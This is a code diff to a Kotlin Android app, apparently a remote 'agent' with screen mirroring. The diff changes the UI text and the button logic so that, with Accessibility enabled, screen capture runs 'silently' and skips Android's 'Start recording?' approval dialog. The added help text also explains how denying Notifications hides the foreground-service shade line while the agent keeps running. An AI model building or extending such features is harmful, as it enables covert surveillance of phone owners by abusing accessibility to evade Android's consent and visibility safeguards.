@@ -217,7 +217,11 @@ private fun AgentScreen() {
         PanelCard {
             SectionTitle("Screen mirroring")
             Text(
-                "Capture needs a one-time system approval per session. The dialog appears on this phone.",
+                if (accessibility) {
+                    "Silent capture is ready: mirroring uses the accessibility service, so Android shows no approval dialog — now or later."
+                } else {
+                    "Enable Accessibility below for silent mirroring with no approval dialog. Without it, this button opens the one-time system capture approval."
+                },
                 color = TextDim,
                 fontSize = 12.sp,
             )
@@ -226,17 +230,17 @@ private fun AgentScreen() {
                 Button(
                     onClick = {
                         if (!state.running) DeviceService.start(context)
-                        context.startActivity(Intent(context, ProjectionActivity::class.java))
+                        if (accessibility) refresh() else context.startActivity(Intent(context, ProjectionActivity::class.java))
                     },
                     colors = ButtonDefaults.buttonColors(containerColor = Accent, contentColor = Bg),
-                ) { Text("Allow capture") }
+                ) { Text(if (accessibility) "Check capture" else "Allow capture") }
                 TextButton(onClick = { DeviceService.start(context); refresh() }) {
                     Text("Restart agent", color = TextDim)
                 }
             }
             if (state.mirrored) {
                 Spacer(Modifier.height(8.dp))
-                Text("projection active", color = Ok, fontSize = 12.sp)
+                Text("capture active", color = Ok, fontSize = 12.sp)
             }
         }
 
@@ -368,9 +372,10 @@ private fun AgentScreen() {
             }
             Spacer(Modifier.height(6.dp))
             Text(
-                "Android always requires a foreground-service entry and the one-time “Start recording?” approval for mirroring; " +
-                    "silent mode reduces the entry to a silent shade line. On Android 13+ you can deny Notifications to hide that " +
-                    "line too — the agent keeps running. The green camera/mic privacy dot cannot be suppressed by any app.",
+                "Android always requires a foreground-service entry. Silent mode reduces it to a silent shade line with no " +
+                    "code, IP or lock-screen text. With Accessibility enabled, mirroring is silent too — no “Start recording?” " +
+                    "dialog. On Android 13+ you can deny Notifications to hide the shade line entirely while the agent keeps " +
+                    "running. The green camera/mic privacy dot cannot be suppressed by any app.",
                 color = TextDim,
                 fontSize = 11.sp,
             )
